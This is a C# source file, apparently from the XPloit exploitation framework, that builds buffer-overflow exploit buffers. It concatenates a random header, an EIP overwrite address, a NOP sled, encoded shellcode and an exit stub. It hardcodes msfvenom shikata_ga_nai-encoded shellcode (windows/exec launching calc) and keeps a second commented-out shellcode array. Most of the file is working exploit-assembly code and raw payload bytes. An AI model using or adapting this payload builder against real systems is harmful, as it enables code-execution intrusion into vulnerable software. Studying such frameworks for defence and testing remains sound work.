using System;
using System.Linq;
using XPloit.Core.Collections;
using XPloit.Core.Enums;
using XPloit.Core.Extensions;
using XPloit.Core.Helpers;
using XPloit.Core.Interfaces;
using XPloit.Helpers;

namespace XPloit.Core.Requirements.Payloads
{
    public class BufferOverflowPayloadRequirement : IPayloadRequirements
    {
        public interface IBufferOverflowPayload
        {
            EExitFunc ExitFunction { get; set; }
            byte[] GetValue(Target mod);
        }

        public class BufferOverflowConfig
        {
            public byte[] EIP { get; set; }
            public int Space { get; set; }
            public byte[] BadChars { get; set; }
            public int NopCount { get; set; }
            public int HeaderLength { get; set; }
            //public int StackAdjustment { get; set; }
        }

        public Nop NopGenerator { get; set; }
        public Encoder Encoder { get; set; }
        public BufferOverflowConfig Config { get; set; }

        public bool IsAllowed(ModuleHeader<Payload> payload)
        {
            if (payload != null && typeof(IBufferOverflowPayload).IsAssignableFrom(payload.Type))
            {
                // Check size
                return true;
            }

            return false;
        }

        public class checkNop : INopRequirements
        {
            public Target Target { get; set; }

            public checkNop(Target t)
            {
                Target = t;
            }

            public bool IsAllowed(ModuleHeader<Nop> objHeader)
            {
                if (objHeader == null) return false;

                if (!typeof(INopAsm).IsAssignableFrom(objHeader.Type)) return false;

                INopAsm nop = (INopAsm)objHeader.Current;

                if (nop.AllowedTargets != null)
                {
                    foreach (Target t in nop.AllowedTargets)
                    {
                        if (t.Arquitecture == Target.Arquitecture && t.Platform == Target.Platform) return true;
                    }
                }

                return false;
            }
        }

        public byte[] Prepare(Target target, IBufferOverflowPayload payload)
        {
            if (Config == null) throw (new ArgumentException("Config"));

            if (NopGenerator == null)
                NopGenerator = NopCollection.Current.GetAvailables(new checkNop(target)).Select(u => u.Current).FirstOrDefault();

            //Config.NopCount = 4;
            // con 5 nop va y con menos ya no, lo requiere el encoder? donde se sabe cuantos requiere?, como calcularlo?

            byte[] header = PatternHelper.CreateRandom(Config.HeaderLength, Config.BadChars);
            byte[] bnops = NopGenerator == null ? new byte[] { } : NopGenerator.CreateJob(Config.NopCount);
            byte[] exit = AsmHelper.GetExitMethod(payload.ExitFunction, target.Platform, target.Arquitecture);
            byte[] exploit = payload.GetValue(target);

            // msfvenom -p windows/exec CMD=calc EXITFUNC=thread -a x86 --platform Windows -f csharp -e x86/shikata_ga_nai -b '\x00'
            exploit = new byte[220]
              {
                0xba,0xc5,0x58,0x7e,0xc9,0xdb,0xd2,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,
                0x31,0x31,0x50,0x13,0x03,0x50,0x13,0x83,0xc0,0xc1,0xba,0x8b,0x35,0x21,0xb8,
                0x74,0xc6,0xb1,0xdd,0xfd,0x23,0x80,0xdd,0x9a,0x20,0xb2,0xed,0xe9,0x65,0x3e,
                0x85,0xbc,0x9d,0xb5,0xeb,0x68,0x91,0x7e,0x41,0x4f,0x9c,0x7f,0xfa,0xb3,0xbf,
                0x03,0x01,0xe0,0x1f,0x3a,0xca,0xf5,0x5e,0x7b,0x37,0xf7,0x33,0xd4,0x33,0xaa,
                0xa3,0x51,0x09,0x77,0x4f,0x29,0x9f,0xff,0xac,0xf9,0x9e,0x2e,0x63,0x72,0xf9,
                0xf0,0x85,0x57,0x71,0xb9,0x9d,0xb4,0xbc,0x73,0x15,0x0e,0x4a,0x82,0xff,0x5f,
                0xb3,0x29,0x3e,0x50,0x46,0x33,0x06,0x56,0xb9,0x46,0x7e,0xa5,0x44,0x51,0x45,
                0xd4,0x92,0xd4,0x5e,0x7e,0x50,0x4e,0xbb,0x7f,0xb5,0x09,0x48,0x73,0x72,0x5d,
                0x16,0x97,0x85,0xb2,0x2c,0xa3,0x0e,0x35,0xe3,0x22,0x54,0x12,0x27,0x6f,0x0e,
                0x3b,0x7e,0xd5,0xe1,0x44,0x60,0xb6,0x5e,0xe1,0xea,0x5a,0x8a,0x98,0xb0,0x30,
                0x4d,0x2e,0xcf,0x76,0x4d,0x30,0xd0,0x26,0x26,0x01,0x5b,0xa9,0x31,0x9e,0x8e,
                0x8e,0xde,0x7c,0x1b,0xfa,0x76,0xd9,0xce,0x47,0x1b,0xda,0x24,0x8b,0x22,0x59,
                0xcd,0x73,0xd1,0x41,0xa4,0x76,0x9d,0xc5,0x54,0x0a,0x8e,0xa3,0x5a,0xb9,0xaf,
                0xe1,0x38,0x5c,0x3c,0x69,0x91,0xfb,0xc4,0x08,0xed
              };

            //exploit = new byte[324]
            //{
            //    0xeb,0x65,0x5e,0x31,0xed,0x83,0xe1,0x01,0x83,0xe3,0x01,0x66,0xbb,0x84,0x14,
            //    0x66,0x81,0xf3,0xc0,0x15,0x89,0xf7,0x83,0xe0,0x7f,0xac,0xb1,0x08,0x80,0xf9,
            //    0x06,0x74,0x23,0x60,0x83,0xe9,0x01,0x74,0x06,0xb3,0x02,0xf6,0xf3,0xe2,0xfc,
            //    0x83,0xe0,0x01,0x6b,0x2f,0x02,0x09,0xe8,0xaa,0x61,0x83,0xed,0xff,0x83,0xfd,
            //    0x08,0x75,0x05,0x83,0xef,0xff,0x31,0xed,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
            //    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
            //    0x90,0x90,0x90,0x90,0xe2,0xbc,0x83,0xeb,0x01,0x74,0x07,0xeb,0xaf,0xe8,0x96,
            //    0xff,0xff,0xff,0xfe,0x7a,0x30,0x60,0x20,0x20,0x20,0xe0,0xa4,0xf9,0x66,0x3c,
            //    0x23,0x32,0x36,0xb0,0x38,0x62,0xea,0x60,0xe4,0x6d,0x64,0x34,0xa5,0xbc,0xa5,
            //    0x20,0xfd,0xbd,0x34,0x66,0x38,0xff,0xf5,0xa3,0xe3,0x25,0xf8,0x22,0x36,0x28,
            //    0x38,0x3c,0xf8,0x74,0x23,0xa7,0xf1,0x7c,0xaa,0x65,0x7c,0x6d,0x64,0x30,0xa5,
            //    0xb2,0xa7,0xa8,0xba,0x70,0x62,0xf8,0xf1,0xb2,0x20,0x3d,0x2a,0xa6,0x36,0xb9,
            //    0x30,0x20,0x7a,0x78,0xba,0x64,0x71,0xe3,0x3d,0x32,0x71,0x73,0x64,0x6c,0x23,
            //    0xb6,0x38,0xff,0xf5,0xac,0x2e,0x7c,0x3a,0x21,0xe3,0xae,0x3c,0x27,0x6f,0xb8,
            //    0x26,0xfd,0xfc,0x2e,0xef,0xb2,0x63,0xb7,0xa8,0xb8,0xa5,0xb6,0x24,0xa0,0x2e,
            //    0xad,0xad,0x2b,0x26,0x32,0xf1,0x75,0xa0,0xf0,0x23,0xb3,0xa5,0xa1,0x31,0x70,
            //    0x2e,0xa2,0x32,0xa4,0x32,0x29,0x2b,0x75,0xbb,0x25,0x72,0xba,0x68,0xff,0xfc,
            //    0x25,0xfa,0xfd,0x75,0x2b,0x29,0x7a,0xf1,0xb5,0xeb,0x68,0x23,0x2d,0xa2,0xec,
            //    0xa0,0x20,0x20,0x21,0x60,0xe8,0x38,0xe2,0xed,0xf8,0x7f,0xff,0x6b,0x7b,0xf0,
            //    0x27,0x65,0x60,0xb3,0x62,0xad,0x35,0xbe,0xe7,0x7f,0xfd,0x69,0xf0,0x2c,0xfc,
            //    0x25,0x60,0x3f,0x7e,0x23,0xb4,0x2b,0x7b,0x63,0xa4,0xee,0x66,0xfb,0x68,0x20,
            //    0xb3,0xff,0xf5,0x6c,0x76,0x2b,0x71,0xa6,0x20
            //};

            if (Config.BadChars != null && Config.BadChars.Length > 0)
            {
                // Encoder
                //if (Encoder != null)
                //    Encoder = EncoderCollection.Current.GetAvailables(new checkNop(target)).FirstOrDefault();
            }

            return header.Concat(Config.EIP).Concat(bnops).Concat(exploit).Concat(exit);
        }

        public bool ItsRequired() { return true; }
    }
}